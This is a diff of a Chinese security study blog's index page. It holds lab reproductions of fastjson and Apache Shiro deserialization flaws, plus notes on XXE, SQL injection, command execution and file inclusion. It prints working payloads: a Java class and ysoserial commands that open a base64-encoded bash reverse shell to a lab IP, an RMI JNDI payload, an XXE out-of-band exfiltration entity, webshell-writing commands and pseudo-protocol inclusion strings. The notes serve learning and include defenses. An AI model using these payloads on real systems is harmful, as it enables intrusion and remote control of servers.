@@ -69,12 +69,16 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-day33_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-终端程序走burp代理" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/12/25/day33_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-25T14:58:44.000Z" itemprop="datePublished">2024-12-25</time>
+    <a href="/2025/01/23/%E7%BB%88%E7%AB%AF%E7%A8%8B%E5%BA%8F%E8%B5%B0burp%E4%BB%A3%E7%90%86/" class="article-date">
+  <time class="dt-published" datetime="2025-01-23T14:01:15.000Z" itemprop="datePublished">2025-01-23</time>
 </a>
     
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">奇技淫巧</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
@@ -83,7 +87,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/25/day33_kls/">day33_kls</a>
+      <a class="p-name article-title" href="/2025/01/23/%E7%BB%88%E7%AB%AF%E7%A8%8B%E5%BA%8F%E8%B5%B0burp%E4%BB%A3%E7%90%86/">终端程序走burp代理</a>
     </h1>
   
 
@@ -91,40 +95,262 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="xxe">xxe</span></h3><h4><span id="原因">原因</span></h4><p>服务器开启了外部实体加载，xml解析器解析了恶意的外部实体，导致读取恶意文件，访问恶意地址</p>
-<h4><span id="预备知识点">预备知识点</span></h4><p>DTD</p>
-<p>文档类型定义</p>
-<p>document type define</p>
-<p>用于约束文档</p>
-<p>一个简单的DTD</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ENTITY author &quot;John Doe&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部实体 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ENTITY author_external SYSTEM &quot;file:///etc/passwd&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 参数实体 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ENTITY % name &quot;to&quot;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用参数实体 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ELEMENT note (%name; from, heading, body)--&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line">Tove</span><br><span class="line"><span class="comment">&lt;!-- 调用实体 --&gt;</span></span><br><span class="line"><span class="symbol">&amp;author;</span></span><br><span class="line">Reminder</span><br><span class="line">Don&#x27;t forget me this weekend!</span><br></pre></td></tr></table></figure>
+        <h2><span id="引子">引子</span></h2><p>今日在使用burp时有需要将某些终端中软件的流量跑到burp中去分析。最后使用proxychains去实现。</p>
+<h2><span id="创建proxychains代理配置文件">创建proxychains代理配置文件</span></h2><p>我自己有在用proxychains做终端中的科学上网代理。这次使用一个新的配置文件去编写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">strict_chain</span><br><span class="line">proxy_dns</span><br><span class="line">remote_dns_subnet 224</span><br><span class="line">tcp_read_time_out 15000</span><br><span class="line">tcp_connect_time_out 8000</span><br><span class="line">[ProxyList]</span><br><span class="line"># your burp proxy config</span><br><span class="line">http    127.0.0.1  8080</span><br></pre></td></tr></table></figure>
 
-<h4><span id="危害">危害</span></h4><p>敏感文件读取</p>
-<p>ddos</p>
-<p>ssrf</p>
-<h4><span id="挖掘">挖掘</span></h4><p>黑盒</p>
-<p>content-type为xml，传入xml</p>
-<p>白盒</p>
-<p>解析了用户传入的xml</p>
-<p>开启了外部实体解析</p>
-<h4><span id="利用">利用</span></h4><p>文件包含</p>
-<p>远程文件内容<br>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">&lt;!--ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;--&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--ENTITY % b &quot;&lt;!ENTITY % c SYSTEM &#x27;http://192.168.2.183:8888/?f=%a;&#x27;--&gt;</span>&quot;&gt;</span><br><span class="line">  %b;</span><br><span class="line">  %c;</span><br><span class="line">				  ``` xml</span><br><span class="line"></span><br><span class="line">包含</span><br><span class="line">  ``` xml</span><br><span class="line">  %d;</span><br><span class="line">  ]&gt;</span><br></pre></td></tr></table></figure></p>
+<h2><span id="在系统级别添加burp的证书">在系统级别添加burp的证书</span></h2><p>linux下添加证书</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /usr/local/share/ca-certificates/burp</span><br><span class="line">cp your_ca.der /usr/local/share/ca-certificates/burp/burp.der</span><br><span class="line">update-ca-trust</span><br></pre></td></tr></table></figure>
+
+<h2><span id="使用样例">使用样例</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">proxychains -f your_proxychains_config.config your_cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1737640423630_0.png" alt="image.png"></p>
+<h2><span id="alinas">alinas</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-q 让proxychains不输出日志</span></span><br><span class="line">alias pp=&#x27;proxychains -q -f ~/tools/burp/proxychains.conf&#x27;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/23/%E7%BB%88%E7%AB%AF%E7%A8%8B%E5%BA%8F%E8%B5%B0burp%E4%BB%A3%E7%90%86/" data-id="cm6z08ora003yy1iwd8ki6y6e" data-title="终端程序走burp代理" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/burp/" rel="tag">burp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-fastjson反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/16/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2025-01-16T13:01:41.000Z" itemprop="datePublished">2025-01-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/16/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">fastjson反序列化</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="概述">概述</span></h2><p>fastjson是java中解析json的库。</p>
+<h3><span id="产生原因">产生原因</span></h3><p>在json字符串中存在<code>@type</code>属性时，fastjson会将该字符串解析为其指定的类。导致不受信任的类被反序列化。</p>
+<h3><span id="影响">影响</span></h3><p>代码执行等</p>
+<p>小于等于1.2.68</p>
+<h2><span id="环境搭建">环境搭建</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd fastjson/1.2.24-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h2><span id="复现">复现</span></h2><p>发送一个json请求</p>
+<p><img src="/../assets/image_1737028931157_0.png" alt="image.png"></p>
+<p>Exp构造</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">Runtime</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">Process</span>;</span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title class_">Runtime</span> rt = <span class="title class_">Runtime</span>.<span class="title function_">getRuntime</span>();</span><br><span class="line">            <span class="title class_">String</span>[] commands = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTgzLzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;;</span><br><span class="line">            <span class="title class_">Process</span> pc = rt.<span class="title function_">exec</span>(commands);</span><br><span class="line">            pc.<span class="title function_">waitFor</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时开启rmi和python监听</p>
+<p><img src="/../assets/image_1737031720039_0.png" alt="image.png"></p>
+<p>发送请求，反弹shell</p>
+<p><img src="/../assets/image_1737032023885_0.png" alt="image.png"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://192.168.2.183:9998/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="攻防">攻防</span></h2><h3><span id="利用">利用</span></h3><p>对于其他版本的fastjson</p>
+<p>1.2.24(首个漏洞)–&gt;1.2.41(黑名单绕过)–&gt;1.2.42(黑名单绕过)–&gt;1.2.45(新利用链)–&gt;1.2.47(AutoType绕过)–&gt;1.2.68(AutoType绕过)</p>
+<h3><span id="防御">防御</span></h3><p>升级版本。新版本fastjson删除了<code>@type</code>特性，从根源上防止反序列化发生</p>
+<h2><span id="参考">参考</span></h2><p><a target="_blank" rel="noopener" href="https://kleinor.github.io/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bfastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80/">JAVA入门到放弃系列之Fastjson反序列化(一)</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/16/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm6z08oqu0025y1iwhyvf8634" data-title="fastjson反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">fastjson反序列化</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-SqlInject" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/13/SqlInject/" class="article-date">
+  <time class="dt-published" datetime="2025-01-13T15:13:40.000Z" itemprop="datePublished">2025-01-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/13/SqlInject/">SqlInject</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="概述">概述</span></h2><h3><span id="产生原因">产生原因</span></h3><p>开发者未严格过滤用户传入的参数，导致恶意sql语句拼接到了sql语句中。</p>
+<h3><span id="影响">影响</span></h3><p>拖库</p>
+<p>修改数据库数据</p>
+<p>获取网站控制权</p>
+<h3><span id="分类">分类</span></h3><p>根据利用方式划分</p>
+<p>联合查询注入</p>
+<p>报错注入</p>
+<p>布尔盲注</p>
+<p>时间盲注</p>
+<p>根据sql语句类型分</p>
+<p>select型(最常见)</p>
+<p>update型</p>
+<p>insert型</p>
+<p>delete型</p>
+<p>特殊注入方式</p>
+<p>宽字节注入</p>
+<p>二次编码注入</p>
+<p>二阶注入</p>
+<p>堆叠注入</p>
+<h2><span id="挖掘">挖掘</span></h2><h3><span id="黑盒">黑盒</span></h3><p>手动一般测试方法：</p>
+<p>实现网站正常功能</p>
+<p>测试闭合符号</p>
+<p>寻找回显位</p>
+<p>获取信息</p>
+<h3><span id="白盒">白盒</span></h3><p>php重点函数<code>mysqli_query</code></p>
+<p>观察执行sql语句的位置是否存在不安全拼接</p>
+<h2><span id="攻防">攻防</span></h2><h3><span id="利用">利用</span></h3><p>mysql中获取数据库信息</p>
+<p>mysql写shell</p>
+<p>日志</p>
+<p>INTO OUTFILE</p>
+<h3><span id="防御">防御</span></h3><p>PDO预处理</p>
+<p>最小化数据库权限</p>
+<p>站库分离</p>
+<h3><span id="绕过防御">绕过防御</span></h3><p>各种编码</p>
+<h2><span id="其他">其他</span></h2><h3><span id="工具">工具</span></h3><p>[[sqlmap]]</p>
+<h3><span id="靶场">靶场</span></h3><p>[[sqli-labs]]</p>
+<h3><span id="文章">文章</span></h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/13/SqlInject/" data-id="cm6z08oq50002y1iw6jqb2peh" data-title="SqlInject" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SqlInject/" rel="tag">SqlInject</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-CVE-2016-4437" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/13/CVE-2016-4437/" class="article-date">
+  <time class="dt-published" datetime="2025-01-13T14:42:14.000Z" itemprop="datePublished">2025-01-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/13/CVE-2016-4437/">CVE-2016-4437</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="概述">概述</span></h2><p>Shiro550，也称为Apache Shiro反序列化漏洞</p>
+<h3><span id="产生原因">产生原因</span></h3><p>Shiro框架在处理记住密码功能（RememberMe）时使用的默认或可预测的AES加密密钥。导致攻击者可构造出恶意序列化数据。</p>
+<p>流程:</p>
+<p>用户登陆时勾选Remember Me</p>
+<p>服务端校验并返回加密后的Cookie</p>
+<p>数据加密过程:用户序列化数据-&gt; AES加密-&gt; base64编码</p>
+<p>勾选RememberMe后登陆成功返回的包</p>
+<p><img src="/../assets/image_1736774962890_0.png" alt="image.png"></p>
+<h3><span id="影响">影响</span></h3><p>Apache Shiro 1.2.4及以前</p>
 <p>命令执行</p>
-<p><code>expect://cmd</code></p>
-<p>ddos</p>
-<p>循环调用</p>
-<h4><span id="防御">防御</span></h4><p>不允许外部实体</p>
-<p>过滤伪协议</p>
+<h2><span id="环境搭建">环境搭建</span></h2><p>使用vulhub提供的docker-compose.yml搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd shiro/CVE-2016-4437</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h2><span id="复现">复现</span></h2><p>漏洞特征:</p>
+<p>登陆时相应包中存在<code>Set-Cookie: rememberMe=deleteMe;</code></p>
+<p>验证漏洞存在:</p>
+<p>使用URLDNS反序列化链进行dns外带。检测是否存在反序列化漏洞。</p>
+<p>复现步骤:</p>
+<p>尝试登陆，在返回包中发现特征<code>Set-Cookie: rememberMe=deleteMe;</code></p>
+<p><img src="/../assets/image_1736774918663_0.png" alt="image.png"></p>
+<p>生成payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar URLDNS &quot;http://lu5bzg.dnslog.cn&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p>构造Cookie</p>
+<p><img src="/../assets/image_1736776383194_0.png" alt="image.png"></p>
+<blockquote>
+<p>构造代码请参考vulhub</p>
+</blockquote>
+<p>携带Cookie发送请求</p>
+<p><img src="/../assets/image_1736776715335_0.png" alt="image.png"></p>
+<p>查看dnslog平台</p>
+<p><img src="/../assets/image_1736776679632_0.png" alt="image.png"></p>
+<blockquote>
+<p>已有解析过来了。证明存在反序列化漏洞</p>
+</blockquote>
+<h2><span id="攻防">攻防</span></h2><h3><span id="利用">利用</span></h3><p>利用反序列化链<code>CommonsBeanutils1</code>进行命令执行</p>
+<p>反弹shell，生成payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTgzLzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p>构造Cookie并发起请求</p>
+<p><img src="/../assets/image_1736777312968_0.png" alt="image.png"></p>
+<h3><span id="工具">工具</span></h3><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">GitHub frohoff&#x2F;ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">GitHub SummerSec&#x2F;ShiroAttack2: shiro反序列化漏洞综合利用,包含（回显执行命令&#x2F;注入内存马）修复原版中NoCC的问题 https://github.com/j1anFen/shiro_attack</a></p>
+<h3><span id="防御">防御</span></h3><p>更新shiro到1.2.4以上的版本</p>
+<p>自定义AES密钥。配置文件:<code>shiro.ini</code></p>
+<h2><span id="参考">参考</span></h2><p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/shiro/CVE-2016-4437/">Vulhub Docker-Compose file for vulnerability environment</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/380382.html">shiro反序列化漏洞原理分析以及漏洞复现 FreeBuf网络安全行业门户</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/25/day33_kls/" data-id="cm5vste57001tfriw98u53ela" data-title="day33_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/13/CVE-2016-4437/" data-id="cm6z08or1002uy1iwfk1v4b5m" data-title="CVE-2016-4437" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xxe/" rel="tag">xxe</a></li></ul>
-
     </footer>
   </div>
   
@@ -133,12 +359,16 @@
 
 
   
-    <article id="post-day32_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Sec-Linux常用命令" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/12/24/day32_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-24T15:12:24.000Z" itemprop="datePublished">2024-12-24</time>
+    <a href="/2025/01/11/Sec-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-date">
+  <time class="dt-published" datetime="2025-01-11T13:22:21.000Z" itemprop="datePublished">2025-01-11</time>
 </a>
     
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/changeme/">changeme</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
@@ -147,7 +377,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/24/day32_kls/">day32_kls</a>
+      <a class="p-name article-title" href="/2025/01/11/Sec-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">Sec-Linux常用命令</a>
     </h1>
   
 
@@ -155,40 +385,15 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="反弹shell命令解析">反弹shell命令解析</span></h3><p>一个简单的反弹shell命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.2.233/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p><code>bash -i</code>交互式执行bash</p>
-<p><code>&gt;&amp;</code>将输出和错误重定向</p>
-<p><code>0&gt;&amp;1</code>将输出重定向到输入</p>
-<h3><span id="命令执行">命令执行</span></h3><p>原因</p>
-<p>开发装未对用户输入做严格校验，将用户可控参数拼接到了命令执行函数中，导致恶意命令被执行</p>
-<p>危害</p>
-<p>恶意命令被执行</p>
-<p>挖掘</p>
-<p>黑盒</p>
-<p>白盒</p>
-<p>利用</p>
-<p>拼接符</p>
-<p>&amp;&amp;,||,&amp;,|,;</p>
-<p>写webshell</p>
-<p><code>echo &quot;webshell&quot; &gt; x.php</code></p>
-<p>base64写webshell</p>
-<p><code>echo base64_content | base64 -d &gt; x.php</code></p>
-<p>反弹shell</p>
-<p>受害者</p>
-<p><code>bash -i &gt;&amp; /dev/tcp/your_ip/23333 0&gt;&amp;1</code></p>
-<p>监听主机</p>
-<p><code>nc -lvnp 23333</code></p>
-
+        <h2><span id="引子">引子</span></h2><h2><span id="正文">正文</span></h2><h2><span id="参考">参考</span></h2>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/24/day32_kls/" data-id="cm5vste55001nfriw7ev238wn" data-title="day32_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/11/Sec-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" data-id="cm6z08oq30001y1iw2oc28reg" data-title="Sec-Linux常用命令" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BC%B9shell/" rel="tag">反弹shell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/blog/" rel="tag">blog</a></li></ul>
 
     </footer>
   </div>
@@ -198,88 +403,10 @@
 
 
   
-    <article id="post-day31_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-week9_kls_exam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/12/23/day31_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-23T14:46:11.000Z" itemprop="datePublished">2024-12-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/23/day31_kls/">day31_kls</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="文件包含">文件包含</span></h3><h4><span id="分类">分类</span></h4><p>本地文件包含</p>
-<p>远程文件包含</p>
-<p>伪协议</p>
-<h4><span id="原因">原因</span></h4><p>开发者未对用户输入的文件名进行严格的校验</p>
-<h4><span id="危害">危害</span></h4><p>php文件包含会将任意文件都当作php代码执行，导致执行恶意php代码</p>
-<p>泄漏敏感信息</p>
-<h4><span id="挖掘">挖掘</span></h4><p>白盒</p>
-<p>看php特殊函数</p>
-<p>黑盒</p>
-<p>直接干</p>
-<h4><span id="利用">利用</span></h4><p>结合目录穿越泄漏敏感信息</p>
-<p>结合文件上传包含本地文件</p>
-<p>快速远程文件包含</p>
-<p>gayhub</p>
-<p>便签网</p>
-<p>伪协议包含</p>
-<p>file:&#x2F;&#x2F;</p>
-<p><code>file:///etc/passwd</code></p>
-<p><code>file://C:\Windows\System32\drivers\etc\hosts</code></p>
-<p>php:&#x2F;&#x2F;filter</p>
-<p><code>php://filter/read=convert.base64-encode/resource=path/to/file</code></p>
-<p>php:&#x2F;&#x2F;input</p>
-<p>allow_url_include &#x3D; On</p>
-<p>payload放post请求体中</p>
-<p>zip:&#x2F;&#x2F;</p>
-<p><code>zip:///var/www/html/uploads/22112.zip%23shshsh.php</code></p>
-<p>data:&#x2F;&#x2F;</p>
-<p>allow_url_fopen &#x3D; On allow_url_include &#x3D; On</p>
-<p><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8-IA==</code></p>
-<p>phar:&#x2F;&#x2F;</p>
-<p><code>phar:///var/www/html/uploads/22112.zip/shshsh.php</code></p>
-<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087"></a></p>
-<h4><span id="防御">防御</span></h4><p>修改配置文件</p>
-<p>allow_url_include</p>
-<p>过滤</p>
-<p>过滤伪协议</p>
-<p>白名单</p>
-<p>禁用远程文件包含</p>
-<h4><span id="绕过防御">绕过防御</span></h4>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/23/day31_kls/" data-id="cm5vste55001mfriw4jag33tn" data-title="day31_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-week6_kls_exam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/20/week6_kls_exam/" class="article-date">
-  <time class="dt-published" datetime="2024-12-20T06:10:36.000Z" itemprop="datePublished">2024-12-20</time>
+    <a href="/2025/01/10/week9_kls_exam/" class="article-date">
+  <time class="dt-published" datetime="2025-01-10T06:55:31.000Z" itemprop="datePublished">2025-01-10</time>
 </a>
     
   <div class="article-category">
@@ -294,7 +421,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/20/week6_kls_exam/">week6_kls_exam</a>
+      <a class="p-name article-title" href="/2025/01/10/week9_kls_exam/">week9_kls_exam</a>
     </h1>
   
 
@@ -302,64 +429,70 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2><span id="题目1">题目1</span></h2><p>注册账号上去瞅瞅，能上传文件，让俺试一试</p>
-<p><img src="/../assets/image_1734673092865_0.png" alt="image.png"></p>
-<p>俺传上去了一个php，直接getshell</p>
-<p>连接webshell</p>
-<p><img src="/../assets/image_1734673165002_0.png" alt="image.png"></p>
-<p>flag大大方方的在这里啦</p>
